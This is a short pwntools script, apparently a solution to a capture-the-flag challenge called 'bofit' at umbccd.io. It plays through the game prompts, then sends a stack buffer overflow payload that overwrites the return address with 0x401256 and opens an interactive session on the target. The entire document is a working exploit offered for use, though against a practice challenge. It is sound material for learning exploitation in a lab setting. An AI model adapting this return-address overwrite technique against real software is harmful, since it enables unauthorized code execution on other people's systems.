from pwn import *

rem = 0

if(rem):
	p = remote("umbccd.io", 4100)
else:
	p = process("./bofit")
	input("Ready for debug... ")

print(p.recvuntil("BOF it to start!\n").decode())
p.sendline("B")

x = p.recvline().decode()

while(x[0] != "S"):
	print(x[0])
	
	p.sendline(x[0])
	x = p.recvline().decode()

p.sendline(b"A" * 8 + b"\x00" + b"A" * 47 + p64(0x0000000000401256))

p.interactive()

